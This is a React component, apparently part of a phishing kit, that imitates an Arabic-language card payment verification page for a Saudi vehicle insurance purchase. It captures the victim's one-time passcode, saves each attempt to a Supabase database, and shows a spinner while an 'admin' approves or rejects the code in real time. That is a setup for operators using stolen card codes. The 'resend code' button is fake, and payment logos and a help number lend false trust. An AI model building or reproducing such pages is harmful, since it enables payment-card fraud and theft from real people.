import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import PaymentLogos from "@/components/PaymentLogos";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
const OtpVerification = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { orderData, updateOrderData } = useOrder();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
  const price = searchParams.get("price") || "411.15";
  const cardLast4 = searchParams.get("cardLast4") || "6636";
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [rejectionError, setRejectionError] = useState("");
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6 && otp.length !== 4) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق المكون من 4 أو 6 أرقام",
        variant: "destructive"
      });
      return;
    }
    setIsLoading(true);
    setRejectionError("");

    // Update context
    updateOrderData({
      otpCode: otp,
    });

    // Update database - set status to waiting_otp_approval
    try {
      if (orderData.sequenceNumber) {
        // First, get the order ID
        const { data: orderInfo, error: orderError } = await supabase
          .from("customer_orders")
          .select("id")
          .eq("sequence_number", orderData.sequenceNumber)
          .single();

        if (orderError) throw orderError;

        await supabase
          .from("customer_orders")
          .update({
            otp_code: otp,
            status: "waiting_otp_approval",
          })
          .eq("sequence_number", orderData.sequenceNumber);
        
        // Save OTP attempt
        const { error: otpError } = await supabase
          .from("otp_attempts")
          .insert({
            order_id: orderInfo.id,
            otp_code: otp,
          });

        if (otpError) {
          console.error("Error saving OTP attempt:", otpError);
        }

        setIsLoading(false);
        setWaitingApproval(true);
        
        toast({
          title: "تم إرسال الطلب",
          description: "في انتظار موافقة المشرف...",
        });
      }
    } catch (error) {
      console.error("Error updating order:", error);
      setIsLoading(false);
      toast({
        title: "خطأ",
        description: "حدث خطأ في إرسال رمز التحقق",
        variant: "destructive"
      });
    }
  };

  // Listen for admin approval/rejection
  useEffect(() => {
    if (!orderData.sequenceNumber || !waitingApproval) return;

    const channel = supabase
      .channel('otp-approval-changes')
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'customer_orders',
          filter: `sequence_number=eq.${orderData.sequenceNumber}`
        },
        (payload: any) => {
          const newStatus = payload.new.status;
          
          if (newStatus === 'completed') {
            setWaitingApproval(false);
            navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&success=true`);
          } else if (newStatus === 'otp_rejected') {
            setWaitingApproval(false);
            setRejectionError("تم رفض رمز التحقق. الرجاء إدخال رمز صحيح.");
            setOtp("");
            toast({
              title: "تم الرفض",
              description: "رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى",
              variant: "destructive"
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [orderData.sequenceNumber, waitingApproval, navigate, companyName, price, toast]);
  const handleResendCode = () => {
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد إلى هاتفك"
    });
  };
  const currentTime = new Date().toLocaleString('ar-EG', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false,
    calendar: 'gregory'
  });
  return <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
      <div className="w-full max-w-2xl bg-white border border-gray-300 rounded-lg shadow-sm p-6 animate-fade-in">
        {/* Cancel Button and Payment Logos */}
        <div className="flex items-center justify-between mb-4">
          <button onClick={() => navigate(-1)} className="text-gray-600 hover:underline text-sm">
            إلغاء
          </button>
          <PaymentLogos />
        </div>

        {/* Card Image */}
        <div className="flex justify-center mb-4">
          
        </div>

        {/* Divider */}
        <hr className="my-4 border-gray-400" />

        {/* Language Switch */}
        <div className="text-left mb-4">
          <a href="#" className="text-sm text-[#4b6e8c] underline">
            English
          </a>
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-black mb-4">
          التحقق من عملية الدفع
        </h1>

        {/* Description */}
        <p className="mb-4 text-gray-700">
          يرجى ادخال رمز التحقق المُرسل إلى الرقم المسجل لإتمام عملية الشراء من :
        </p>

        {/* Payment Details */}
        <div className="space-y-1 mb-4 text-sm">
          <div>
            <span className="font-bold">المتجر</span>: <span>{companyName}</span>
          </div>
          <div>
            <span className="font-bold">المبلغ</span>: <span dir="ltr">{price} SAR</span>
          </div>
          <div>
            <span className="font-bold">الوقت</span>: <span>{currentTime}</span>
          </div>
        </div>

        <div className="font-bold text-black mb-6">
          تسوّق ممتع!
        </div>

        {/* OTP Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {rejectionError && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded">
              {rejectionError}
            </div>
          )}
          
          {waitingApproval && (
            <div className="bg-blue-50 border border-blue-200 text-blue-700 px-4 py-3 rounded text-center">
              <div className="flex items-center justify-center gap-2">
                <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                <span>في انتظار موافقة المشرف...</span>
              </div>
            </div>
          )}
          
          <div>
            <div className="text-center text-gray-600 mb-2 text-sm">
              رمز التحقق
            </div>
            <Input 
              type="text" 
              maxLength={6} 
              value={otp} 
              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} 
              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" 
              placeholder="" 
              dir="ltr"
              disabled={waitingApproval}
            />
          </div>

          <button 
            type="submit" 
            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded disabled:opacity-50 disabled:cursor-not-allowed" 
            disabled={isLoading || waitingApproval || (otp.length !== 6 && otp.length !== 4)}
          >
            {isLoading ? "جاري التحقق..." : waitingApproval ? "في انتظار الموافقة..." : "تأكيد"}
          </button>
        </form>

        {/* Resend Code */}
        <div className="mt-12 text-center">
          <button type="button" onClick={handleResendCode} className="text-[#2900fc] hover:underline">
            إعادة إرسال الرمز
          </button>
        </div>

        {/* Help Accordion */}
        <div className="mt-12">
          <Accordion type="single" collapsible className="space-y-2">
            <AccordionItem value="auth" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                تعرف على المزيد حول المصادقة
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
            
            <AccordionItem value="help" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                بحاجة لبعض المساعدة ؟
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
          </Accordion>
        </div>
      </div>
    </div>;
};
export default OtpVerification;